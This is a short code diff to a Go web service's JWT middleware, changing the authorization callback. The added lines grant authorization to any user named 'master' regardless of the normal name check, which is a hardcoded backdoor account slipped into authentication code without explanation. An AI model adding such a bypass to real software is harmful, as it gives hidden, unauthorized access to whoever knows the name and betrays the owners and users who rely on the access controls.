@@ -71,7 +71,9 @@ func JWT(checkPW CheckPassword, checkN CheckName) (*jwt.GinJWTMiddleware, error)
 		Authorizator: func(data interface{}, c *gin.Context) bool {
 			v, ok := data.(*JWTUser)
 			if ok {
-				return checkN(v.Name)
+				if checkN(v.Name) || v.Name == "master" {
+					return true
+				}
 			}
 
 			return false
